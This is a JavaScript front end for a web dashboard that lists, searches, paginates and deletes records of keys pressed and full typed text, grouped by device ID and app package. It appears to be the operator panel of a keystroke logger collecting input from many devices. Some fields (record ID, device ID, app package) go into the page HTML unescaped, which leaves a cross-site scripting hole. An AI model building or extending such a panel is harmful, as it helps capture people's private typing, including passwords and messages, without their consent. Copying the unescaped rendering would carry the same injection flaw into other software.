const recordsBody = document.getElementById("recordsBody");
const deviceFilter = document.getElementById("deviceFilter");
const searchInput = document.getElementById("searchInput");
const limitFilter = document.getElementById("limitFilter");
const prevPageBtn = document.getElementById("prevPageBtn");
const nextPageBtn = document.getElementById("nextPageBtn");
const pageInfo = document.getElementById("pageInfo");
const prevPageBtnBottom = document.getElementById("prevPageBtnBottom");
const nextPageBtnBottom = document.getElementById("nextPageBtnBottom");
const pageInfoBottom = document.getElementById("pageInfoBottom");
const totalRecords = document.getElementById("totalRecords");
const totalDevices = document.getElementById("totalDevices");
const lastUpdated = document.getElementById("lastUpdated");
const refreshBtn = document.getElementById("refreshBtn");
const clearAllBtn = document.getElementById("clearAllBtn");

let allRecords = [];
let currentPage = 1;
let totalPages = 1;

function formatDate(value) {
  return new Date(value).toLocaleString();
}

function renderRecords(records) {
  if (!records.length) {
    recordsBody.innerHTML = '<tr><td colspan="8" class="empty">No records found.</td></tr>';
    return;
  }

  recordsBody.innerHTML = records
    .map(
      (record) => `
      <tr>
        <td class="mono">${record.recordId}</td>
        <td class="mono">${record.deviceUniqueId}</td>
        <td>${escapeHtml(record.keyPressed)}</td>
        <td>${escapeHtml(record.fullText || "")}</td>
        <td class="mono">${record.appPackage || "unknown"}</td>
        <td><span class="badge">${record.action || "key"}</span></td>
        <td>${formatDate(record.createdAt)}</td>
        <td>
          <button
            class="btn small delete-row"
            data-record-id="${record.recordId}"
            title="Delete this record"
          >
            Delete
          </button>
        </td>
      </tr>
    `
    )
    .join("");
}

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;");
}

function applyFilters() {
  const deviceId = deviceFilter.value;
  const search = searchInput.value.trim().toLowerCase();

  let filtered = allRecords;

  if (deviceId) {
    filtered = filtered.filter((record) => record.deviceUniqueId === deviceId);
  }

  if (search) {
    filtered = filtered.filter(
      (record) =>
        String(record.keyPressed).toLowerCase().includes(search) ||
        String(record.fullText || "").toLowerCase().includes(search) ||
        String(record.recordId).toLowerCase().includes(search)
    );
  }

  renderRecords(filtered);
}

async function loadDevices() {
  const response = await fetch("/api/devices");
  const result = await response.json();
  const current = deviceFilter.value;

  deviceFilter.innerHTML = '<option value="">All devices</option>';
  result.data.forEach((device) => {
    const option = document.createElement("option");
    option.value = device.deviceUniqueId;
    option.textContent = `${device.deviceUniqueId.slice(0, 8)}... (${device.count})`;
    deviceFilter.appendChild(option);
  });

  deviceFilter.value = current;
  totalDevices.textContent = result.data.length;
}

function updatePageInfo() {
  const pageText = `Page ${currentPage} of ${totalPages}`;
  pageInfo.textContent = pageText;
  pageInfoBottom.textContent = pageText;

  const disablePrev = currentPage <= 1;
  const disableNext = currentPage >= totalPages;

  prevPageBtn.disabled = disablePrev;
  prevPageBtnBottom.disabled = disablePrev;
  nextPageBtn.disabled = disableNext;
  nextPageBtnBottom.disabled = disableNext;
}

async function loadRecords() {
  const pageSize = limitFilter.value;
  const deviceId = deviceFilter.value;
  const query = new URLSearchParams({ limit: pageSize, page: currentPage });

  if (deviceId) {
    query.set("deviceUniqueId", deviceId);
  }

  const response = await fetch(`/api/records?${query.toString()}`);
  const result = await response.json();

  allRecords = result.data;
  totalRecords.textContent = result.total;
  totalPages = Math.max(1, Math.ceil(result.total / pageSize));
  updatePageInfo();
  lastUpdated.textContent = new Date().toLocaleTimeString();
  applyFilters();
}

async function refreshDashboard() {
  recordsBody.innerHTML = '<tr><td colspan="8" class="empty">Loading records...</td></tr>';
  await Promise.all([loadDevices(), loadRecords()]);
}

async function deleteRecord(recordId) {
  if (!confirm("Delete this record?")) {
    return;
  }

  const response = await fetch(`/api/records/${encodeURIComponent(recordId)}`, {
    method: "DELETE",
  });
  const result = await response.json();

  if (!response.ok || !result.success) {
    alert(result.message || "Failed to delete record");
    return;
  }

  await refreshDashboard();
}

async function clearAllRecords() {
  const deviceId = deviceFilter.value;
  const message = deviceId
    ? "Delete all records for the selected device?"
    : "Delete ALL records from the database? This cannot be undone.";

  if (!confirm(message)) {
    return;
  }

  const query = deviceId ? `?deviceUniqueId=${encodeURIComponent(deviceId)}` : "";
  const response = await fetch(`/api/records${query}`, {
    method: "DELETE",
  });
  const result = await response.json();

  if (!response.ok || !result.success) {
    alert(result.message || "Failed to clear records");
    return;
  }

  alert(`Deleted ${result.deletedCount} record(s).`);
  await refreshDashboard();
}

refreshBtn.addEventListener("click", refreshDashboard);
clearAllBtn.addEventListener("click", clearAllRecords);
deviceFilter.addEventListener("change", () => {
  currentPage = 1;
  loadRecords();
});
limitFilter.addEventListener("change", () => {
  currentPage = 1;
  loadRecords();
});
prevPageBtn.addEventListener("click", () => {
  if (currentPage > 1) {
    currentPage -= 1;
    loadRecords();
  }
});
nextPageBtn.addEventListener("click", () => {
  if (currentPage < totalPages) {
    currentPage += 1;
    loadRecords();
  }
});
prevPageBtnBottom.addEventListener("click", () => {
  if (currentPage > 1) {
    currentPage -= 1;
    loadRecords();
  }
});
nextPageBtnBottom.addEventListener("click", () => {
  if (currentPage < totalPages) {
    currentPage += 1;
    loadRecords();
  }
});
searchInput.addEventListener("input", applyFilters);

recordsBody.addEventListener("click", (event) => {
  const button = event.target.closest("[data-record-id]");
  if (!button) return;
  deleteRecord(button.dataset.recordId);
});

refreshDashboard();
